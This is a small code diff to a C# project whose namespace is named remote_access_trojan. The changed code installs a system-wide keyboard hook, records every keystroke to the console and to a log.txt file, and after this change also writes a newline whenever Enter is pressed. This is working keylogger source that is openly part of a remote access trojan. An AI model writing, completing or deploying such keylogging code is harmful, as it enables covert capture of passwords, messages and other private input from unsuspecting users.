@@ -12,8 +12,12 @@ namespace remote_access_trojan
         {
             var api = new KeystrokeAPI();
             api.CreateKeyboardHook((character) => {
-                Console.Write(character);
-                File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), character.ToString());
+                string output = character.ToString();
+                if (character.KeyCode == KeyCode.Enter)
+                    output += "\n";
+
+                Console.Write(output);
+                File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), output);
             });
         }
     }
